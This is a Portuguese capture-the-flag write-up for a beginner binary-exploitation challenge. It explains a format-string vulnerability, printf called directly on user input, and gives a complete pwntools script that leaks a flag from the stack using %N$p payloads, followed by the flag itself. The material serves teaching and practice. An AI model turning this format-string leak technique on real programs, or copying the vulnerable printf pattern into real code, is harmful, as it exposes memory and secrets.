# WriteUp: The Adventure Begins

## Descrição do Desafio

**Categoria:** pwn 

**Descrição:**

> Welcome to the binary exploitation track! Can you leak the flag from memory and embark on this adventure?

### Arquivos

| Arquivo | Descrição |
| --- | --- |
| main.c | Código-fonte do desafio. |
| flag.txt | Arquivo fictício da flag. |
| solve.py | Script da solução. |

## Passo a Passo da Solução

### 1. Análise do Código e Vulnerabilidade

Analisando o código-fonte em C fornecido no desafio (`main.c`), é possível ver duas etapas principais no fluxo de execução:

Primeiramente, o programa abre o arquivo `flag.txt` e lê o seu conteúdo para a variável local `buffer[100]`. Como se trata de uma variável declarada na função `main`, o valor da flag é armazenado diretamente na *stack*. Mesmo após a execução do `fclose()`, os dados permanecem na pilha de memória.

```c
// Read the contents of the "flag.txt" file into a buffer
FILE *file = fopen("flag.txt", "r");
...
char buffer[100];
if (fgets(buffer, sizeof(buffer), file) == NULL) { ... }
fclose(file);

```

Em seguida, dentro de um laço de repetição, o programa lê o nome do usuário e constrói uma mensagem de boas-vindas usando `snprintf()`, passando o resultado diretamente para a função `printf()` sem utilizar especificadores de formato:

```c
snprintf(message, sizeof(message), "Welcome %s! %s\n", userName, greetings[randomIndex]);
printf(message);

```

O uso de `printf(message)` em vez de `printf("%s", message)` caracteriza uma vulnerabilidade clássica de **Format String**. Como a variável `message` contém dados fornecidos pelo usuário através de `userName`, é possível passar especificadores como `%p` para vazar valores diretamente da *stack*.

{% hint style="info" %}

**Nota:** Como a flag já se encontra na *stack*, não é necessário sobrescrever endereços de memória ou redirecionar o fluxo de execução, bastando realizar um *Memory Leak*.

{% endhint %}

### 2. Exploit

Para obter a flag, precisamos identificar em qual posição da *stack* (*offset*) o `buffer` contendo o texto do arquivo foi armazenado em relação à chamada da `printf`.

Em arquiteturas x86_64, a string da flag (`OWASP{...`) é organizada na pilha em formato *Little-Endian*. Ao testar os *offsets* de leitura com `%N$p`, vemos que os dados da flag começam a ser lidos a partir da **posição 34**.

Para realizar o processo, o script em Python faz a requisição dos *offsets* de 34 a 38, extrai os ponteiros em formato hexadecimal e realiza o desempacotamento (*unpacking*) dos *bytes* para reconstruir a string original.

{% code title="solve.py" overflow="wrap" lineNumbers="true" %}

```py
from pwn import *

# Configuracoes de contexto do binario
context.arch = 'amd64'
context.log_level = 'info'

def solve():
    io = process('./chall')

    leaked_hexs = []
    # Offsets da stack onde o buffer da flag se encontra
    start_offset = 34
    end_offset = start_offset + 5

    # Vazamento dos ponteiros em hex via format string
    for i in range(start_offset, end_offset):
        payload = f"%{i}$p"
        io.sendlineafter(b"Enter your name: ", payload.encode())

        output = io.recvline().decode()
        
        # Filtra a resposta para extrair o valor hexadecimal retornado
        words = output.split()
        for w in words:
            if w.startswith("0x"):
                clean_hex = w.rstrip("!").rstrip(".")
                leaked_hexs.append(clean_hex)
                break

    log.info(f"Valores hexadecimais vazados: {leaked_hexs}")

    # Reconstrucao da flag desempacotando os bytes (Little-Endian)
    flag_bytes = b""
    for hex_val in leaked_hexs:
        val = int(hex_val, 16)
        flag_bytes += p64(val)

    # Tratamento da string final
    flag = flag_bytes.decode('latin-1', errors='ignore').split('}')[0] + '}'
    log.success(f"Flag obtida: {flag}")

    io.close()

if __name__ == "__main__":
    solve()

```

{% endcode %}

### Flag

`OWASP{f0rm4t_str1ng_m3m0ry_l34k_ftw}`

## Autor da WriteUp

[Membro de Exploitation - Jenni-Lopes](https://github.com/Jenni-Lopes)